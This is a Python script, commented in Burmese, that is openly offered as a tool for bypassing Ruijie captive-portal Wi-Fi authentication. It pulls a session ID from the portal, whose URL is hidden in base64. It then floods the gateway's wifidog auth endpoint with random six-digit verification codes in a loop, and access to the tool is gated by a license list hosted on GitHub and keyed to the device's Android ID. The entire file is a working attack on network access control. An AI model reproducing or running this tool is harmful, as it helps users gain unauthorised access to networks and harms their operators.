#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import json
import base64
import random
import string
import hashlib
import requests
import threading
import aiohttp
import asyncio
import ping3
from datetime import datetime, date
from urllib.parse import quote, urlparse, parse_qs, urljoin

# ==========================================
# 0. GITHUB LICENSE SYSTEM
# ==========================================

# သင်ပေးထားသော GitHub Raw Link
GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

LICENSE_STORAGE = os.path.expanduser("~/.ruijie_license.json")
KEY_STORAGE_FILE = os.path.expanduser("~/.ruijie_device_key.txt")

def get_stable_device_id():
    """Hardware ID (HWID) ကို ထုတ်ယူပြီး ဖုန်းထဲတွင် သိမ်းဆည်းပေးသည့်အပိုင်း"""
    if os.path.exists(KEY_STORAGE_FILE):
        try:
            with open(KEY_STORAGE_FILE, 'r') as f:
                saved_key = f.read().strip()
                if saved_key:
                    return saved_key
        except:
            pass
    
    try:
        import subprocess
        # Android ID ကို ရယူရန် ကြိုးစားခြင်း
        android_id = subprocess.check_output("settings get secure android_id", shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if android_id and len(android_id) > 5:
            stable_key = hashlib.md5(f"STABLE_{android_id}".encode()).hexdigest()[:16]
        else:
            import uuid
            install_path = os.path.dirname(os.path.abspath(__file__))
            stable_key = hashlib.md5(f"{install_path}{uuid.getnode()}".encode()).hexdigest()[:16]
    except:
        # အဆင်မပြေပါက random key တစ်ခု ထုတ်ပေးခြင်း
        stable_key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    
    try:
        with open(KEY_STORAGE_FILE, 'w') as f:
            f.write(stable_key)
    except:
        pass
    
    return stable_key

def save_license_to_cache(expiry_date_str):
    """License အောင်မြင်ပါက ဖုန်းထဲတွင် cache အနေဖြင့် သိမ်းထားခြင်း"""
    data = {"device_id": get_stable_device_id(), "expiry": expiry_date_str, "verified_at": datetime.now().isoformat()}
    try:
        with open(LICENSE_STORAGE, 'w') as f:
            json.dump(data, f)
        return True
    except:
        return False

def load_license_from_cache():
    """သိမ်းထားသော license ရှိပါက ပြန်ဖတ်ခြင်း"""
    if not os.path.exists(LICENSE_STORAGE):
        return None
    try:
        with open(LICENSE_STORAGE, 'r') as f:
            data = json.load(f)
            if data.get("device_id") == get_stable_device_id():
                return data
    except:
        pass
    return None

def fetch_online_license():
    """GitHub မှ key စာရင်းကို လှမ်းဖတ်ခြင်း"""
    try:
        response = requests.get(GITHUB_KEY_URL, timeout=10)
        if response.status_code == 200:
            return response.text.strip().split('\n')
    except:
        pass
    return None

def verify_license_online():
    """အွန်လိုင်းပေါ်ရှိ key များနှင့် HWID တိုက်စစ်ခြင်း"""
    sys_key = get_stable_device_id()
    lines = fetch_online_license()
    
    if lines is None:
        return None, None, "NETWORK_ERROR"
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
            
        # CSV format (ID, Name, Date, Status) သို့မဟုတ် Plain text (ID) နှစ်မျိုးလုံးဖတ်နိုင်ရန်
        data = [d.strip().strip('"') for d in line.split(',')]
        
        if data and data[0] == sys_key:
            # Expiry date ပါရင်ဖတ်မည် (Column index 2)
            expiry_str = data[2] if len(data) >= 3 else "UNLIMITED"
            
            # Block စစ်ဆေးခြင်း (Column index 3)
            if len(data) >= 4 and "BLOCK" in data[3].upper():
                return False, expiry_str, "BLOCKED"
                
            if expiry_str != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d").date()
                    if date.today() > expiry_date:
                        return False, expiry_str, "EXPIRED"
                except:
                    pass
            return True, expiry_str, "ACTIVE"
    
    return False, "N/A", "NOT_FOUND"

def check_license():
    """အဓိက License စစ်ဆေးသည့် အပိုင်း"""
    sys_key = get_stable_device_id()
    print(f"{CYAN}[*] Device ID: {WHITE}{sys_key}{RESET}")
    
    online_result, expiry_str, msg = verify_license_online()
    
    if online_result is True:
        print(f"{GREEN}[✓] License ACTIVE (Expires: {expiry_str}){RESET}")
        save_license_to_cache(expiry_str)
        return True
    elif online_result is False:
        print(f"{RED}[✗] License INVALID: {msg}{RESET}")
        cached = load_license_from_cache()
        if cached:
            cached_expiry = cached.get("expiry", "UNLIMITED")
            if cached_expiry != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(cached_expiry, "%Y-%m-%d").date()
                    if date.today() <= expiry_date:
                        print(f"{GREEN}[✓] Using CACHED license (Expires: {cached_expiry}){RESET}")
                        return True
                except:
                    pass
        return False
    else:
        # Network Error ဖြစ်ပါက Cache ထဲမှ အရင်ဖတ်ပေးခြင်း
        cached = load_license_from_cache()
        if cached:
            cached_expiry = cached.get("expiry", "UNLIMITED")
            if cached_expiry != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(cached_expiry, "%Y-%m-%d").date()
                    if date.today() <= expiry_date:
                        print(f"{GREEN}[✓] Using CACHED license (Offline, Expires: {cached_expiry}){RESET}")
                        return True
                except:
                    pass
        print(f"{RED}[✗] No valid license found (Need internet for first activation){RESET}")
        return False

# ==========================================
# COLORS (Neko Style)
# ==========================================

RESET = "\033[0m"
BLACK = "\033[30m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def Line():
    print(f"{DIM}{'─'*50}{RESET}")

def Logo():
    clear()
    neko_art = f"""{MAGENTA}
        ╱|、
       (˚ˎ 。7  
        |、˜〵          
        じしˍ,)ノ {RESET}{GREEN}Neko WiFi Engine{RESET}
{MAGENTA}     「 internet bypass · stealth mode 」{RESET}
"""
    print(neko_art)
    Line()
    print(f"{DIM}[*] Ruijie Network Router Bypass Tool{RESET}")
    print(f"{DIM}[*] License: GitHub Managed{RESET}")
    Line()

# ==========================================
# INTERNET BYPASS FUNCTIONS
# ==========================================

async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
            return session_id
    except Exception:
        return previous_session_id

class InternetAccess:
    def __init__(self):
        # Ruijie portal link (Base64 encoded)
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        
        try:
            self.ip = open(".ip", "r").read().strip()
        except FileNotFoundError:
            print(f"{RED}[!] Running first time setup...{RESET}")
            setup()
            try:
                self.ip = open(".ip", "r").read().strip()
            except:
                print(f"{RED}[!] Setup failed. Check Wi-Fi.{RESET}")
                sys.exit(1)

    def get_random_code(self):
        return "".join(random.choice(string.digits) for _ in range(6))

    async def send_request(self, session, session_id, log=True):
        random_code = self.get_random_code()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        params = {'token': session_id, 'phoneNumber': random_code}
        try:
            async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params=params, headers=headers) as response:
                if log:
                    status_code = f"{GREEN}{response.status}"
                    now = f"{BLUE}{time.strftime('%H:%M:%S')}"
                    ping_val = await asyncio.to_thread(ping3.ping, 'google.com')
                    ping_str = self.format_ping(ping_val)
                    is_online = await self.check_connectivity(session)
                    print(f"{DIM}[{now}]{RESET} {YELLOW}→{RESET} status: {status_code}{RESET} | ping: {ping_str} | {is_online}", end="\r")
        except:
            pass
    
    async def check_connectivity(self, session):
        try:
            async with session.get("https://httpbin.org/get", timeout=3) as req:
                return f"{GREEN}● ONLINE{RESET}"
        except:
            return f"{RED}● OFFLINE{RESET}"
    
    def format_ping(self, ping):
        if ping is None: return f'{RED}N/A{RESET}'
        ms = int(ping * 1000)
        if ms >= 100: return f'{RED}{ms}ms{RESET}'
        if ms >= 50: return f'{YELLOW}{ms}ms{RESET}'
        return f'{GREEN}{ms}ms{RESET}'
    
    async def execute(self):
        Logo()
        print(f"{GREEN}[+] Neko Stealth Engine Active{RESET}")
        print(f"{DIM}[+] Press Ctrl+C to stop{RESET}")
        Line()
        
        connector = aiohttp.TCPConnector(limit=10)
        async with aiohttp.ClientSession(connector=connector) as session:
            loop = 0
            session_id = None
            while True:
                if loop % 5 == 0:
                    session_id = await get_session_id(session, self.session_url, session_id)
                if session_id:
                    tasks = [self.send_request(session, session_id) for _ in range(5)]
                    await asyncio.gather(*tasks)
                loop += 1
                await asyncio.sleep(1)

# ==========================================
# SETUP & MAIN
# ==========================================

def setup():
    print(f"{CYAN}[*] Setup Mode - Capturing Gateway Info{RESET}")
    try:
        res = requests.get("http://192.168.0.1", timeout=5).url
        ip = re.search(r'gw_address=(.*?)&', res).group(1)
        with open(".ip", "w") as f: f.write(ip)
        print(f"{GREEN}[✓] Gateway IP: {ip} saved{RESET}")
    except Exception as e:
        print(f"{RED}[✗] Setup failed: {e}{RESET}")
        sys.exit(1)

def main():
    Logo()
    if not check_license():
        print(f"{RED}[!] License check failed. Use --key to get ID.{RESET}")
        sys.exit(1)
    
    if not os.path.exists(".ip"): setup()
    
    iobj = InternetAccess()
    try:
        asyncio.run(iobj.execute())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Stopped by user{RESET}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "--key":
            print(f"\n{GREEN}Device ID: {get_stable_device_id()}{RESET}")
            sys.exit(0)
        elif sys.argv[1] == "--reset":
            for f in [LICENSE_STORAGE, KEY_STORAGE_FILE, ".ip"]:
                if os.path.exists(f): os.remove(f)
            print(f"{GREEN}[✓] Cache cleared{RESET}")
            sys.exit(0)
    main()

